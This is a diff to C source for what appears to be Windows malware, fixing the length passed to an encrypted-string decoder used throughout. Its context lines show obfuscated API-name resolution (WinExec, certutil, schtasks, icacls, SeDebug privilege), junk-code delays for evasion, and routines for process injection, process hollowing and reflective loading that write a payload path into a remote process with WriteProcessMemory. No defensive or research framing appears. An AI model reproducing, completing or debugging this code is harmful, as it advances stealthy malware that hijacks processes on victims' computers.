@@ -216,7 +216,7 @@ static pWinExec_t          g_pfnWinExec = NULL;
 
 /* Initialize all obfuscated APIs at startup */
 void obf_init_apis(void) {
-    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
+    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
     if (!hKernel32) hKernel32 = LoadLibraryA(kernel32);
     
@@ -257,21 +257,21 @@ UINT obf_WinExec(LPCSTR lpCmdLine, UINT uCmdShow) {
 
 /* === Obfuscated string access === */
 
-char* obf_ntdll(void) { return get_str(enc_ntdll, sizeof(enc_ntdll)-1); }
-char* obf_unmap(void) { return get_str(enc_unmap, sizeof(enc_unmap)-1); }
-char* obf_setinfo(void) { return get_str(enc_setinfo, sizeof(enc_setinfo)-1); }
-char* obf_queryinfo(void) { return get_str(enc_queryinfo, sizeof(enc_queryinfo)-1); }
-char* obf_sedebug(void) { return get_str(enc_sedebug, sizeof(enc_sedebug)-1); }
-char* obf_icacls(void) { return get_str(enc_icacls, sizeof(enc_icacls)-1); }
-char* obf_certutil(void) { return get_str(enc_certutil, sizeof(enc_certutil)-1); }
-char* obf_schtasks(void) { return get_str(enc_schtasks, sizeof(enc_schtasks)-1); }
-char* obf_ps(void) { return get_str(enc_ps, sizeof(enc_ps)-1); }
-char* obf_loadlib(void) { return get_str(enc_loadlib, sizeof(enc_loadlib)-1); }
-char* obf_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)-1); }
-char* obf_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)-1); }
-char* obf_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)-1); }
-char* obf_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)-1); }
-char* obf_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)-1); }
+char* obf_ntdll(void) { return get_str(enc_ntdll, sizeof(enc_ntdll)); }
+char* obf_unmap(void) { return get_str(enc_unmap, sizeof(enc_unmap)); }
+char* obf_setinfo(void) { return get_str(enc_setinfo, sizeof(enc_setinfo)); }
+char* obf_queryinfo(void) { return get_str(enc_queryinfo, sizeof(enc_queryinfo)); }
+char* obf_sedebug(void) { return get_str(enc_sedebug, sizeof(enc_sedebug)); }
+char* obf_icacls(void) { return get_str(enc_icacls, sizeof(enc_icacls)); }
+char* obf_certutil(void) { return get_str(enc_certutil, sizeof(enc_certutil)); }
+char* obf_schtasks(void) { return get_str(enc_schtasks, sizeof(enc_schtasks)); }
+char* obf_ps(void) { return get_str(enc_ps, sizeof(enc_ps)); }
+char* obf_loadlib(void) { return get_str(enc_loadlib, sizeof(enc_loadlib)); }
+char* obf_getproc(void) { return get_str(enc_getproc, sizeof(enc_getproc)); }
+char* obf_getmod(void) { return get_str(enc_getmod, sizeof(enc_getmod)); }
+char* obf_enumproc(void) { return get_str(enc_enumproc, sizeof(enc_enumproc)); }
+char* obf_getbasename(void) { return get_str(enc_getbasename, sizeof(enc_getbasename)); }
+char* obf_winexec(void) { return get_str(enc_winexec, sizeof(enc_winexec)); }
 
 /* === Junk code insertion helpers === */
 
@@ -503,7 +503,7 @@ void obf_sys_inject_process(void) {
     obf_WriteProcessMemory(hProc, remotePath, payloadPath, pathLen, NULL);
     obf_junk_delay();
     
-    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
+    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
     FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
     DWORD_PTR kernel32Base = (DWORD_PTR)hKernel32;
@@ -630,7 +630,7 @@ void obf_sys_hollow_process(void) {
     obf_WriteProcessMemory(hProc, rPath3, path3, p3len, NULL);
     
     /* Get WinExec and Sleep addresses */
-    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
+    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
     FARPROC pWinExec = GetProcAddress(hKernel32, obf_winexec());
     FARPROC pSleep = GetProcAddress(hKernel32, "Sleep");
@@ -1022,7 +1022,7 @@ void obf_reflective_load(void) {
      *     offset     = localAddr - localBase
      *     remoteAddr = remoteBase + offset   <-- ASLR-safe
      */
-    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32)-1);
+    char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
 
     char *enumProcStr = obf_enumproc();
